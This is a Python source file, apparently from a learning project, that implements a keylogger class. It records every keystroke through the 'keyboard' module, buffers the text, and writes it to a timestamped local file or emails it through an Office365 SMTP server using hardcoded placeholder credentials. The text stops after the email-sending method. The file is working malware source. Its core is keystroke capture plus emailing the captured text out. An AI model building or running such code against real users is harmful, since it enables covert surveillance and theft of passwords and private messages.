# listen to keystrokes in the background
# whenever a key is pressed and released, add it to global string variable
# every X number of minutes, write this string to local file or email

# look into 'keyloggers' module

import keyboard
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_INTERVAL = 120 # number of seconds to send the string

EMAIL_ADDRESS = "Dwight.Schrute@DunderMifflin.com"
EMAIL_PASSWORD = "BearsBeetsBattlestarGalactica"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        self.log = ""   # stores the keystrokes

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # this is called whenever a key is released
        name = event.name

        if len(name) > 1:

            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name


    # if you use a log file, the filename is made with start and end timestamps
    # take datetimes, convert to string and make a filename (the name of the logs)
    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    # create a log file in current working directory that has current keylogs in 'self.log' variable
    # makes a new file named 'self.filename' and saves the keylogs in it
    def report_to_file(self):

        # create the file (open in 'write' mode) and write the keylogs to the file
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    # make MIMEMultipart from text, creates HTML and text versions to send as email
    # you're basically sending yourself an email with the keylogs
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS         # send it to yourself
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogs"

        html = f"<p>{message}</p>"          # body of the email
        mime_text = MIMEText(message, "plain")
        mime_html = MIMEText(html, "html")
        msg.attach(mime_text)
        msg.attach(mime_html)

        # after creating the email, return it as a string
        return msg.as_string()


    # manage connnection to SMTP server
    def sendmail(self, email, password, message, verbose=True):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)

        server.starttls()        # connect to SMTP server with TLS for security

        server.login(email, password)       # login to your email account

        server.sendmail(email, email, self.prepare_mail(message))   # send the email

        server.quit()             # end the session

        if verbose:                # print to the console
            print(f"[*] - {datetime.now()} - Sent an email to {email} with the following message:\n{message}")